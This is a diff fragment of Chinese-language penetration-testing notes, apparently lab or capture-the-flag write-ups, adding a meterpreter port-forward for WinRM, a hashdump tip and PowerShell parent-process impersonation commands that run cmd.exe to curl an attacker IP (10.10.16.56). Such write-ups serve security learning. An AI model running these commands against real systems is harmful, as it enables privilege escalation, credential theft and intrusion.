@@ -952,10 +952,14 @@ https://blog.csdn.net/m0_52742680/article/details/135905285?utm_medium=distribut
 
 也可在拿到meterpreter后使用hashdump抓取管理员密码hash然后内网穿透,使用winrm登录
 
+portfwd add –l 5985 –p 5985 –r 127.0.0.1
 
 ```
-. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c powershell.exe curl http://10.10.16.56:8000"
+. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c curl 10.10.16.56:8000"
 ```
+
+. .\.ps1|ImpersonateFromParentPid -ppid 552 -command "cmd.exe" -cmdargs "/c curl 10.10.16.56"
+
 ### Manager
 #### user
 - nmap
